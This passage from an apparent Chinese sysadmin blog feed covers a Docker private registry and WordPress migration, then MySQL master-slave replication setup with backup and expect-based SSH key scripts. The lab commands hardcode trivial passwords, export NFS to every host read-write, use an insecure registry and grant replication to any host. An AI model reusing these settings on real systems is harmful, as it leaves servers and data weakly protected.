10.0.0.129:/etc/docker/<br><br>6.修改docker的源daemon.json<br><br>systemctl daemon-reload;systemctl restart docker<br><br>7.测试安装服务<br>docker images<br>docker ps -a<br><br><br>yum -y install httpd php php-mysqlnd php-json<br><span class="hljs-built_in">chown</span> apache.apache /var/www/html/*<br>ll /var/www/html/*<br></code></pre></td></tr></table></figure><p>2.拷贝所有web01站点的信息过去，docker需要映射出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.配置docker基础环境<br><br>--拉取最新镜像<br>docker pull wordpress<br><br>--拉取仓库镜像，运行<br>docker pull registry<br>docker run -d -p 5000:5000 --restart=always --name registry -v /apps/myregistry:/var/lib/registry registry<br><br>--打标签<br>docker image tag wordpress 10.0.0.128:5000/wordpress:v1.0<br>[root@master registry]<span class="hljs-comment">#docker images</span><br>REPOSITORY                  TAG       IMAGE ID       CREATED         SIZE<br>10.0.0.128:5000/wordpress   v1.0      c3c92cc3dcb1   9 months ago    616MB<br><br>--配置insucure的镜像仓库地址<br>vim /etc/docker/daemon.json<br>&#123;<br>    <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>        <span class="hljs-string">&quot;https://plqjafsr.mirror.aliyuncs.com&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;exec-opts&quot;</span>: [<br>        <span class="hljs-string">&quot;native.cgroupdriver=systemd&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;log-driver&quot;</span>: <span class="hljs-string">&quot;json-file&quot;</span>,<br>    <span class="hljs-string">&quot;log-opts&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;max-size&quot;</span>: <span class="hljs-string">&quot;100m&quot;</span><br>    &#125;,<br>    <span class="hljs-string">&quot;storage-driver&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span>,<br>    <span class="hljs-string">&quot;insecure-registries&quot;</span>: [<span class="hljs-string">&quot;10.0.0.128:5000&quot;</span>] ---配置本地仓库<br>&#125;<br><br>--重新加载<br>systemctl daemon-reload<br>systemctl restart docker<br><br>--推送，查看<br>docker push 10.0.0.128:5000/wordpress:v1.0<br>curl http://10.0.0.128:5000/v2/_catalog<br>&#123;<span class="hljs-string">&quot;repositories&quot;</span>:[<span class="hljs-string">&quot;wordpress&quot;</span>]&#125;<br><br>--slave1尝试<br>[root@slave1 ~]<span class="hljs-comment">#curl http://10.0.0.128:5000/v2/_catalog</span><br>&#123;<span class="hljs-string">&quot;repositories&quot;</span>:[<span class="hljs-string">&quot;wordpress&quot;</span>]&#125;<br><br><br>2.slave1拉取镜像，运行<br><br>--slave1<br>docker pull 10.0.0.128:5000/wordpress:v1.0<br><br>docker run --name wordpress -p 8002:80 --restart=always -v /apps/wordpress:/var/www/html/  -d 10.0.0.128:5000/wordpress:v1.0<br>docker run --name wordpress -p 8002:80 --restart=always -v /apps/wordpress:/var/www/html/  -d wordpress<br>docker start `docker ps -a | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br><br>--拷贝web01的文件到/apps/wordpress<br>scp -r -p /apps/wordpress/* 10.0.0.129:/apps/wordpress/<br><br>rsync -a /apps/wordpress/* 10.0.0.129:/apps/wordpress/<br><br>3.试运行<br>docker stop `docker ps -a | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br>docker start `docker ps -a | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br>docker <span class="hljs-built_in">rm</span> -f `docker ps -a | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br></code></pre></td></tr></table></figure><p>3.配置WEB01的DNS解析，添加A记录</p><p>4.前端添加一个nginx或者是LVS，实现前端负载均衡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将docker的目录共享出来</span><br>/apps/wordpress *(rw,all_squash)<br><br>exportfs -r<br>exportfs -v<br>/apps/wordpress<br>&lt;world&gt;(<span class="hljs-built_in">sync</span>,wdelay,hide,no_subtree_check,sec=sys,rw,secure,root_squash,all_squash)<br><br><span class="hljs-comment">#10.0.0.129挂载docker目录</span><br>[root@slave1 wordpress]<span class="hljs-comment">#showmount -e 10.0.0.128</span><br>Export list <span class="hljs-keyword">for</span> 10.0.0.128:<br>/apps/wordpress *<br><br>[root@slave1 wordpress]<span class="hljs-comment">#docker restart ae516f4c8676</span><br>ae516f4c8676<br>[root@slave1 wordpress]<span class="hljs-comment">#docker ps</span><br>CONTAINER ID   IMAGE                            COMMAND                  CREATED      STATUS         PORTS                                   NAMES<br>ae516f4c8676   10.0.0.128:5000/wordpress:v1.0   <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   4 days ago   Up 2 seconds   0.0.0.0:8002-&gt;80/tcp, :::8002-&gt;80/tcp   wordpress<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL主从复制与集群</title>
    <link href="/2023/07/28/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%8E%E9%9B%86%E7%BE%A4/"/>
    <url>/2023/07/28/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%8E%E9%9B%86%E7%BE%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="MySQL主从复制与集群"><a href="#MySQL主从复制与集群" class="headerlink" title="MySQL主从复制与集群"></a>MySQL主从复制与集群</h1><p>主要是掌握主从复制的原理和实现过程，搭建MySQL主从集群</p><p>MySQL单节点工作的弊端：存在单点故障，导致整个系统崩溃的问题，无法查询等</p><p>扩展到MySQL集群的好处：需要将同一份数据放在两个DB server上，主从复制保证数据的一致性，基于binlog</p><p>可以在读写分离/主从复制架构中加入proxy代理，对外只有一个IP/域名，内部的机制</p><p>1.消除单点故障</p><p>2.提高读写性能，提高性能瓶颈</p><p>3.使用读写分离，写(更新机)和读(查询机)分开部署，提高查询库的用途—&gt;开源软件可以用mycat来代替proxy</p><p><img src="2792175-20220925210227793-1189300600.png" alt="image-20220910111746875"></p><h1 id="MySQL主从复制原理：异步复制"><a href="#MySQL主从复制原理：异步复制" class="headerlink" title="MySQL主从复制原理：异步复制"></a>MySQL主从复制原理：异步复制</h1><p><img src="2792175-20220925210228149-1798635484.png" alt="image-20220910112944703"></p><p>主从复制的方式：异步复制，主从节点之间可能会有数据的丢失，因为采用异步复制不保证同步的一定的实时性</p><p>异步复制在复制同步大量的数据时：比如执行存储过程，可能是百万千万条记录一起插入到库中，会导致同步时延非常大，可能到1min往上了</p><figure class="highlight sql"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs sql">[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> slave status \G;<br><br>Seconds_Behind_Master: <span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><h2 id="1-开启binlog"><a href="#1-开启binlog" class="headerlink" title="1.开启binlog"></a>1.开启binlog</h2><p>master主节点开启二进制功能binlog，开启两个binlog开关，最好是主从节点都开启</p><p>新数据更新写操作，先写事务日志redo_log，在写binlog</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> &quot;%log_bin%&quot;;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> &quot;%sql_log_bin%&quot;;<br><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> sql_log_bin<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>log_bin<span class="hljs-operator">=</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>binlog<br>systemctl restart mysqld<br><br>flush logs; <span class="hljs-comment">--更新日志文件，更新Binlog</span><br></code></pre></td></tr></table></figure><h2 id="2-开启dump同步线程"><a href="#2-开启dump同步线程" class="headerlink" title="2.开启dump同步线程"></a>2.开启dump同步线程</h2><p>服务线程—IO线程—sql thread</p><p>同步机制：异步复制，下发写操作，更新，返回客户端(无论是本地socket也好，还是远程工具也好)，最好是用异步复制，效率比较高；数据库一般都是并发读写操作的</p><p>实时同步：同步数据到从节点成功后，才返回写操作OK</p><p>实时同步binlog到从节点，同步binlog的pos，保证位置的一致性</p><p>binlog同步完成后写入到中继日志relay_log，通过sql thread写入到从库中，完成数据更新，其实relay_log就是主节点binlog同步后的存放位置，是主节点的数据更新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs none">--创建一个用户用于同步，允许访问所有库<br><br>--指定从哪个pos开始查看并导出binlog日志<br>mysqlbinlog --start-position=524 /data/mysql/binlog/rocky-bin.000003 &gt; /backup/binlog.sql<br></code></pre></td></tr></table></figure><h2 id="各种复制架构"><a href="#各种复制架构" class="headerlink" title="各种复制架构"></a>各种复制架构</h2><p><img src="2792175-20220925210228503-1041412468.png" alt="image-20220910143032579"></p><p>1.首选主—&gt;从，比较均衡</p><p>2.1主2从，增加冗余性，1主从2从，增加冗余性，但是复制存在延迟</p><p>3.两个主，互为主备节点，存在双写数据冲突的问题，可以配置读写分离代理实现，master1+2作为读写节点，一个坏了另一个马上升级为主节点，提供服务</p><p>在proxy上指定一下读写操作指向节点的IP就行</p><p>搭建主从架构的问题：最好是数据库版本一致，从节点最好是使用高版本，因为不同版本之间存在binlog日志格式不一致的问题，高版本可以兼容低版本的</p><p>slave：高版本，5.7-8.0，最好是重装，然后导入完整备份就行</p><p>master：低版本，5.7-8.0</p><p><img src="2792175-20220925210228885-127523952.png" alt="image-20220910143711805"></p><h1 id="搭建MySQL主从同步环境"><a href="#搭建MySQL主从同步环境" class="headerlink" title="搭建MySQL主从同步环境"></a>搭建MySQL主从同步环境</h1><p>环境：主master 10.0.0.132，基本步骤，注意：主从复制关系在机器服务重启后仍然保持同步状态；从节点关机后，在开机后马上可以同步过来，如果数据量大存在一定的延迟</p><p>从slave：10.0.0.128</p><p>version：mysql 8.0.30</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>主节点<br><span class="hljs-number">1</span>） 二进制日志<br><span class="hljs-number">2</span>） server_id<span class="hljs-operator">=</span><br><span class="hljs-number">3</span>) 创建用户，replication slave 权限<br><span class="hljs-number">4</span>） 全备份 <span class="hljs-comment">--master-data=1，--master-data=2，binlog的pos加上注释</span><br><br><span class="hljs-number">2.</span>从节点<br><span class="hljs-number">1</span>) server_id<span class="hljs-operator">=</span><br><span class="hljs-number">2</span>) source <span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>full.sql 导入备份<br><span class="hljs-number">3</span>) CHANGE MASTER <span class="hljs-keyword">TO</span>      修改主节点信息<br>  MASTER_HOST<span class="hljs-operator">=</span><span class="hljs-string">&#x27;10.0.0.8&#x27;</span>,<br>  MASTER_USER<span class="hljs-operator">=</span><span class="hljs-string">&#x27;repluser&#x27;</span>,<br>  MASTER_PASSWORD<span class="hljs-operator">=</span><span class="hljs-string">&#x27;123456&#x27;</span>,<br>  MASTER_PORT<span class="hljs-operator">=</span><span class="hljs-number">3306</span>,<br>MASTER_LOG_FILE<span class="hljs-operator">=</span><span class="hljs-string">&#x27;mysql-bin.000002&#x27;</span>, MASTER_LOG_POS<span class="hljs-operator">=</span><span class="hljs-number">30489887</span>,<br>MASTER_CONNECT_RETRY<span class="hljs-operator">=</span><span class="hljs-number">5</span>;<br><span class="hljs-number">4</span>) <span class="hljs-keyword">start</span> slave;<br><br>stop slave;<br>reset slave <span class="hljs-keyword">all</span>; ##重置从节点<br>master status：执行DML语句后的pos开始复制<br><span class="hljs-keyword">start</span> slave;<br><br><span class="hljs-number">3.</span>主主架构<br></code></pre></td></tr></table></figure><h2 id="1-开启binlog-1"><a href="#1-开启binlog-1" class="headerlink" title="1.开启binlog"></a>1.开启binlog</h2><p>如果是8.0及以下得版本，则需要手动开启binlog</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">##<span class="hljs-number">8.0</span>默认开启binlog<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> &quot;%log_bin%&quot;;<br><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> &quot;%sql_log_bin%&quot;;<br><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> sql_log_bin<span class="hljs-operator">=</span><span class="hljs-number">1</span>;<br><br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>log_bin<span class="hljs-operator">=</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>mysql<span class="hljs-operator">/</span>binlog<span class="hljs-operator">/</span>matser<span class="hljs-operator">-</span>bin <span class="hljs-comment">---&gt;指定Binlog日志文件的前缀</span><br>systemctl restart mysqld<br><br>flush logs; <span class="hljs-comment">--更新日志文件，更新Binlog</span><br></code></pre></td></tr></table></figure><h2 id="2-配置主从节点基本信息"><a href="#2-配置主从节点基本信息" class="headerlink" title="2.配置主从节点基本信息"></a>2.配置主从节点基本信息</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">##主节点，修改hostname<br>hostnamectl <span class="hljs-keyword">set</span><span class="hljs-operator">-</span>hostname master<br><br>##修改mysqld配置文件中的server<span class="hljs-operator">-</span>id，可以配置为<span class="hljs-number">1</span>，每个节点的server<span class="hljs-operator">-</span>id一定要不一样，不然无法区分<br>可以配置为IP地址最后一位<br>vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>[mysqld]<br>server<span class="hljs-operator">-</span>id<span class="hljs-operator">=</span><span class="hljs-number">132</span><br><br>##查看主节点的二进制文件信息，不用指定任何库，直接复制所有新增写入的数据，从这个binlog的pos开始复制，<span class="hljs-comment">--start-position=157</span><br>[(<span class="hljs-keyword">none</span>)]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> master status;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> File             <span class="hljs-operator">|</span> Position <span class="hljs-operator">|</span> Binlog_Do_DB <span class="hljs-operator">|</span> Binlog_Ignore_DB <span class="hljs-operator">|</span> Executed_Gtid_Set <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br><span class="hljs-operator">|</span> rocky<span class="hljs-operator">-</span>bin<span class="hljs-number">.000019</span> <span class="hljs-operator">|</span>      <span class="hljs-number">157</span> <span class="hljs-operator">|</span>              <span class="hljs-operator">|</span>                  <span class="hljs-operator">|</span>                   <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+----------+--------------+------------------+-------------------+</span><br></code></pre></td></tr></table></figure><h2 id="3-主节点创建同步账号，授权"><a href="#3-主节点创建同步账号，授权" class="headerlink" title="3.主节点创建同步账号，授权"></a>3.主节点创建同步账号，授权</h2><h3 id="revoke回收权限"><a href="#revoke回收权限" class="headerlink" title="revoke回收权限"></a>revoke回收权限</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">##查看catyer这个用户的权限<br><span class="hljs-keyword">show</span> grants <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;catyer&#x27;</span>@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------+</span><br><span class="hljs-operator">|</span> Grants <span class="hljs-keyword">for</span> catyer<span class="hljs-variable">@10</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>                                <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">GRANT</span> USAGE <span class="hljs-keyword">ON</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> `catyer`@`<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>`                 <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> PRIVILEGES <span class="hljs-keyword">ON</span> `zabbix`.<span class="hljs-operator">*</span> <span class="hljs-keyword">TO</span> `catyer`@`<span class="hljs-number">10.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>` <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-----------------------------------------------------------+</span><br><br>##回收删除权限<br><span class="hljs-keyword">revoke</span> <span class="hljs-keyword">delete</span> <span class="hljs-keyword">on</span> hellodb.<span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> catyer@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br>flush privileges;<br><br>##回收所有权限<br><span class="hljs-keyword">revoke</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> hellodb.<span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> catyer@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span>;<br>flush privileges;<br></code></pre></td></tr></table></figure><p>各版本之间的差异，一定要执行grant，不然会出现无法生成master节点的dump线程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs sql">##早期版本<span class="hljs-number">5.7</span>左右，授权<span class="hljs-operator">+</span>创建账号<br><span class="hljs-keyword">grant</span> replication slave <span class="hljs-keyword">on</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> sync@<span class="hljs-string">&#x27;%‘ identified by &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">##MySQL 8.0版本</span><br><span class="hljs-string">create user xxx@&#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27; identified by &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">show grants for sync@&#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">##回收权限，刷新权限，赋予复制权限</span><br><span class="hljs-string">revoke all on *.* from sync@&#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">grant replication slave on *.* to sync@&#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">flush privileges;</span><br><span class="hljs-string"></span><br><span class="hljs-string">[(none)]&gt;show grants for sync@&#x27;</span><span class="hljs-operator">%</span><span class="hljs-string">&#x27;;</span><br><span class="hljs-string">+----------------------------------------------+</span><br><span class="hljs-string">| Grants for sync@%                            |</span><br><span class="hljs-string">+----------------------------------------------+</span><br><span class="hljs-string">| GRANT REPLICATION SLAVE ON *.* TO `sync`@`%` |</span><br><span class="hljs-string">+----------------------------------------------+</span><br><span class="hljs-string">1 row in set (0.01 sec)</span><br><span class="hljs-string"></span><br><span class="hljs-string">这一条是failed，证明sync用户没有replication的权限</span><br></code></pre></td></tr></table></figure><p><img src="2792175-20220925210229174-1766550463.png" alt="image-20220911111412948"></p><h2 id="4-主节点做一份全备，导入到备节点，确保初始数据一致"><a href="#4-主节点做一份全备，导入到备节点，确保初始数据一致" class="headerlink" title="4.主节点做一份全备，导入到备节点，确保初始数据一致"></a>4.主节点做一份全备，导入到备节点，确保初始数据一致</h2><p>可以考虑将所有库都备份导出一次，形成不同的.sql文件，然后使用存储过程批量导入.sql数据，写成脚本或者是MySQL的存储过程—&gt;可以查一下，直接或者写成事务，批量化执行，最好是脚本</p><p>因为从库可能是新库，初始数据不一致，如果直接同步的话那就只有新数据，没有老数据了</p><h3 id="单库备份"><a href="#单库备份" class="headerlink" title="单库备份"></a>单库备份</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-operator">!</span><span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>bash<br><span class="hljs-type">TIME</span><span class="hljs-operator">=</span>`<span class="hljs-type">date</span> <span class="hljs-operator">+</span><span class="hljs-operator">%</span>Y<span class="hljs-operator">-</span><span class="hljs-operator">%</span>m<span class="hljs-operator">-</span><span class="hljs-operator">%</span>d_<span class="hljs-operator">%</span>H<span class="hljs-operator">-</span><span class="hljs-operator">%</span>M<span class="hljs-operator">-</span><span class="hljs-operator">%</span>S`<br>DIR<span class="hljs-operator">=</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>backup<br>DB<span class="hljs-operator">=</span>&quot;hellodb&quot;<br>PASS<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>HOST<span class="hljs-operator">=</span><span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span><br><br>##<span class="hljs-operator">-</span>B表示选择<br>[ <span class="hljs-operator">-</span>d $DIR ] <span class="hljs-operator">&amp;&amp;</span> echo &quot;dir exist&quot; <span class="hljs-operator">||</span> mkdir <span class="hljs-operator">-</span>p $DIR<br>mysqldump <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p$PASS <span class="hljs-comment">--single-transaction --source-data=2 -B $DB -F | gzip &gt; $&#123;DIR&#125;/$&#123;DB&#125;.$&#123;TIME&#125;.sql.gz</span><br>#mysqldump <span class="hljs-operator">-</span>usync <span class="hljs-operator">-</span>p$PASS <span class="hljs-operator">-</span>h$HOST <span class="hljs-comment">--single-transaction --source-data=2 -A | gzip &gt; /data/backup/backup.sql.gz</span><br><br>scp $&#123;DIR&#125;<span class="hljs-operator">/</span>$&#123;DB&#125;.$&#123;<span class="hljs-type">TIME</span>&#125;.sql.gz $HOST:<span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>backup<br></code></pre></td></tr></table></figure><h3 id="多库备份，除去系统库-expect-ssh交互"><a href="#多库备份，除去系统库-expect-ssh交互" class="headerlink" title="多库备份，除去系统库+expect ssh交互"></a>多库备份，除去系统库+expect ssh交互</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs sql">#<span class="hljs-operator">!</span><span class="hljs-operator">/</span>bin<span class="hljs-operator">/</span>bash<br><span class="hljs-type">TIME</span><span class="hljs-operator">=</span>`<span class="hljs-type">date</span> <span class="hljs-operator">+</span><span class="hljs-operator">%</span>F_<span class="hljs-operator">%</span>T`<br>DIR<span class="hljs-operator">=</span><span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>backup<br>DB<span class="hljs-operator">=</span>&quot;hellodb&quot;<br>PASS<span class="hljs-operator">=</span><span class="hljs-number">123</span><br><br>##批量化复制主机<br>HOST<span class="hljs-operator">=</span>(<span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.128</span><br><span class="hljs-number">10.0</span><span class="hljs-number">.0</span><span class="hljs-number">.129</span>)<br><br><br>[ <span class="hljs-operator">-</span>d $DIR ] <span class="hljs-operator">&amp;&amp;</span> echo &quot;dir exist&quot; <span class="hljs-operator">||</span> mkdir <span class="hljs-operator">-</span>p $DIR<br>mysqldump <span class="hljs-operator">-</span>uroot <span class="hljs-operator">-</span>p$PASS <span class="hljs-comment">--single-transaction --source-data=2 -A -F &gt; $&#123;DIR&#125;/$&#123;DB&#125;_$&#123;TIME&#125;_all.sql</span><br>#mysqldump <span class="hljs-operator">-</span>usync <span class="hljs-operator">-</span>p$PASS <span class="hljs-operator">-</span>h$HOST <span class="hljs-comment">--single-transaction --source-data=2 -A | gzip &gt; /data/backup/backup.sql.gz</span><br><br><span class="hljs-keyword">for</span> IP <span class="hljs-keyword">in</span> $&#123;HOST[<span class="hljs-operator">*</span>]&#125;;do<br>        #免交互复制ssh<span class="hljs-operator">-</span>keygen到目的主机<br>        expect <span class="hljs-operator">&lt;&lt;</span>EOF<br>        spawn ssh<span class="hljs-operator">-</span><span class="hljs-keyword">copy</span><span class="hljs-operator">-</span>id root@$IP<br>        expect &#123;<br>                &quot;yes/no&quot; &#123;send &quot;yes\n&quot;;exp_continue&#125;<br>                &quot;password&quot; &#123;send &quot;123\n&quot;&#125;<br>        &#125;<br>        expect eof<br>EOF<br>        scp $&#123;DIR&#125;<span class="hljs-operator">/</span>$&#123;DB&#125;_$&#123;<span class="hljs-type">TIME</span>&#125;_all.sql $IP:<span class="hljs-operator">/</span>data<span class="hljs-operator">/</span>backup<br>        echo &quot;$IP copy 